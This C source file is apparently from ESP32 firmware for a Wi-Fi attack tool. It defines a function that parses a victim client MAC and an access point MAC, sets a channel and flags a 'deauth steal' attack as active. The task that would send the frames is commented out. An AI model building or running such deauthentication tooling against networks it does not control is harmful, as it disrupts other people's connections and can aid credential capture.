#include "steal_deauth.h"

static const char* TAG = "STEAL_DEAUTH";

void start_deauth_steal_attack(char *target, char *ap, int channel) {
    // Get deauth task handle
    TaskHandle_t deauth_task_handle = deauth_get_task_handle();

    if(deauthActive) {
        ESP_LOGW(TAG, "Deauth already running");
        return;
    }

    if (deauth_task_handle != NULL) {
        ESP_LOGW(TAG, "Deauth task already exists");
        return;
    }

    ESP_LOGI(TAG, "DEAUTH target=%s ap=%s ch=%d", target, ap, channel);

    uint8_t target_mac[6];
    uint8_t ap_mac[6];

    if (!mac_str_to_bytes(target, target_mac)) {
        ESP_LOGE(TAG, "Invalid TARGET MAC format");
        //BleManager_SendStatus("DEAUTH_BAD_TARGET_MAC");
        return;
    }

    if (!mac_str_to_bytes(ap, ap_mac)) {
        ESP_LOGE(TAG, "Invalid AP MAC format");
        //BleManager_SendStatus("DEAUTH_BAD_AP_MAC");
        return;
    }

    // set target and AP (target_client, target_ap)
    set_deauth_targets(ap_mac, target_mac);
    // set channel (attack_channel)
    set_deauth_channel(channel);

    deauthActive = true;
    isAttackActive = true;

    // Calling task freeRTOS
    // xTaskCreate(
    //     deauth_task,
    //     "deauth_task",
    //     4096,
    //     NULL,
    //     5,  // Priority less than ble
    //     &deauth_task_handle
    // );
    
    ESP_LOGI(TAG, "Deauth steal task created");
}